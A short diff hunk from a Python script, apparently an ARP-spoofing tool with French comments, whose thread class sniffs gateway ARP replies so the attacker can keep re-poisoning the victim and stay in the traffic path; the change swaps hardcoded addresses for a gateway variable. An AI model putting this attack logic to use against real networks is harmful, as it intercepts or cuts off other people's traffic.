@@ -50,7 +50,7 @@ class couperVictime(threading.Thread):
 		#La victime n'est plus trompee et la communication ne passe plus par l'attaquant
 		#Pour empecher cela, on sniff la commnucation entre la gateway et la victime 
 		#Des que la gateway envoie une reponse ARP, l'attaquant usurpe la victime
-		sniff(filter="arp and host 192.168.0.1 or host 192.168.0.100", count=1)
+		sniff(filter="arp and host " + self.IpGw, count=1)
         print "le thread s'est termine proprement" 
     #fonction permettant d'arrêter la boucle du thread
     def stop(self): 
